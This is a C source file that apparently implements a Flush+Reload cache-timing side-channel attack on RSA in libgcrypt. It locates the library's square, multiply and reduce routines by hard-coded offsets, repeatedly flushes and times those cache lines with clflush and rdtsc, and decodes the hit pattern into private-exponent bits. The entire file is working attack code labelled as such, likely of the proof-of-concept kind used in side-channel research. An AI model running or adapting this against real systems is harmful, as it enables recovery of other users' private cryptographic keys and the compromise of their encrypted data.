#include <dlfcn.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

#define CACHE_LINE_SIZE 64
#define TIME_SLOT_CYCLES 2500
#define THRESHOLD 165
#define MAX_SLOTS 50000
#define CALIBRATION_SAMPLES 100000

#define SQR_OFFSET 0x0000000000051470 // _gcry_mpih_sqr_n_basecase
#define MUL_OFFSET 0x0000000000051a70 // _gcry_mpih_mul
#define RED_OFFSET 0x0000000000050450 // _gcry_mpih_divrem

typedef struct {
  void *address;
  char name[32];
  uint64_t timing_history[MAX_SLOTS];
  int slot_count;
} monitored_function_t;

volatile int running = 1;

void signal_handler(int sig) { running = 0; }

// Improved probe function with proper Flush+Reload
static inline int probe(void *addr, uint64_t *time_measured) {
  volatile uint64_t time;

  asm volatile("mfence\n"
               "lfence\n"
               "rdtsc\n"
               "lfence\n"
               "movl %%eax, %%esi\n"
               "movl (%1), %%eax\n"
               "lfence\n"
               "rdtsc\n"
               "subl %%esi, %%eax\n"
               "clflush 0(%1)\n"
               : "=a"(time)
               : "c"(addr)
               : "%esi", "%edx");

  *time_measured = time;
  return time < THRESHOLD;
}

// Get the cycle counter
static inline uint64_t rdtsc() {
  unsigned int lo, hi;
  asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
  return ((uint64_t)hi << 32) | lo;
}

void *get_library_base_address() {
  FILE *maps = fopen("/proc/self/maps", "r");
  if (!maps)
    return NULL;

  char line[1024];
  void *base_addr = NULL;

  while (fgets(line, sizeof(line), maps)) {
    // Look for your specific libgcrypt version
    if (strstr(line, "libgcrypt.so")) {
      unsigned long addr;
      if (sscanf(line, "%lx-", &addr) == 1) {
        base_addr = (void *)addr;
        break;
      }
    }
  }
  fclose(maps);
  return base_addr;
}

// Analyze captured data to extract bit patterns
void analyze_results(monitored_function_t *funcs, int num_funcs,
                     int total_slots) {
  printf("\n=== ANALYSIS RESULTS ===\n");
  printf("Total time slots captured: %d\n", total_slots);

  // Simple pattern detection: S-R-M-R = 1 bit, S-R = 0 bit
  printf("\nDetected bit sequence:\n");

  int i = 0;
  int bit_count = 0;
  char bit_sequence[1024] = {0};

  while (i < total_slots - 4) {
    int sqr_hit = funcs[0].timing_history[i] < THRESHOLD;
    int mul_hit = funcs[1].timing_history[i + 2] < THRESHOLD;

    if (sqr_hit) {
      // Check if followed by multiply (indicates bit=1)
      if (i + 2 < total_slots && mul_hit) {
        bit_sequence[bit_count++] = '1';
        i += 4; // Skip S-R-M-R sequence
      } else {
        bit_sequence[bit_count++] = '0';
        i += 2; // Skip S-R sequence
      }

      if (bit_count % 50 == 0) {
        printf("%s\n", bit_sequence);
        memset(bit_sequence, 0, sizeof(bit_sequence));
        bit_count = 0;
      }
    } else {
      i++;
    }
  }

  if (bit_count > 0) {
    printf("%s\n", bit_sequence);
  }
}

int main(int argc, char *argv[]) {
  void *lib_handle;
  monitored_function_t funcs[3];
  uint64_t slot_start, slot_end;
  int current_slot = 0;
  int threshold = THRESHOLD;

  printf("Flush+Reload RSA Attack (PID: %d)\n", getpid());

  signal(SIGTERM, signal_handler);
  signal(SIGINT, signal_handler);

  lib_handle = dlopen("./lib/libgcrypt.so.11.6.0", RTLD_NOW);
  if (!lib_handle) {
    fprintf(stderr, "Failed to load libgcrypt: %s\n", dlerror());
    return 1;
  }
  printf("Library handle: %p\n", lib_handle);

  void *base_addr = get_library_base_address();
  if (!base_addr) {
    fprintf(stderr, "Failed to get library base address\n");
    dlclose(lib_handle);
    return 1;
  }
  printf("Library base address: %p\n", base_addr);

  // Setup monitoring for square, multiply, and reduce functions
  funcs[0].address = (char *)base_addr + SQR_OFFSET;
  strcpy(funcs[0].name, "Square");
  funcs[0].slot_count = 0;

  funcs[1].address = (char *)base_addr + MUL_OFFSET;
  strcpy(funcs[1].name, "Multiply");
  funcs[1].slot_count = 0;

  funcs[2].address = (char *)base_addr + RED_OFFSET;
  strcpy(funcs[2].name, "Reduce");
  funcs[2].slot_count = 0;

  printf("\nMonitoring functions:\n");
  for (int i = 0; i < 3; i++) {
    printf("  %s: %p\n", funcs[i].name, funcs[i].address);
  }

  printf("\nUsing threshold: %d cycles\n", threshold);
  printf("Starting attack... Press Ctrl+C to stop\n\n");

  // Main attack loop with fixed time slots
  while (running && current_slot < MAX_SLOTS) {
    slot_start = rdtsc();

    // Probe each monitored function
    for (int i = 0; i < 3; i++) {
      uint64_t time;
      int hit = probe(funcs[i].address, &time);
      funcs[i].timing_history[current_slot] = time;

      // Print hits in real-time for debugging
      if (hit) {
        printf("Slot %5d: %s hit (time=%lu)\n", current_slot, funcs[i].name,
               time);
      }
    }

    // Wait until end of time slot
    do {
      slot_end = rdtsc();
    } while ((slot_end - slot_start) < TIME_SLOT_CYCLES);

    current_slot++;

    // Periodic status update
    if (current_slot % 1000 == 0) {
      printf("Captured %d time slots...\n", current_slot);
    }
  }

  // Analyze results
  printf("\n=== ATTACK COMPLETED ===\n");
  printf("Total slots captured: %d\n", current_slot);

  // Count hits for each function
  for (int i = 0; i < 3; i++) {
    int hits = 0;
    for (int j = 0; j < current_slot; j++) {
      if (funcs[i].timing_history[j] < threshold) {
        hits++;
      }
    }
    printf("%s: %d hits (%.2f%%)\n", funcs[i].name, hits,
           (float)hits / current_slot * 100);
  }

  // Analyze bit patterns
  analyze_results(funcs, 3, current_slot);

  dlclose(lib_handle);
  return 0;
}
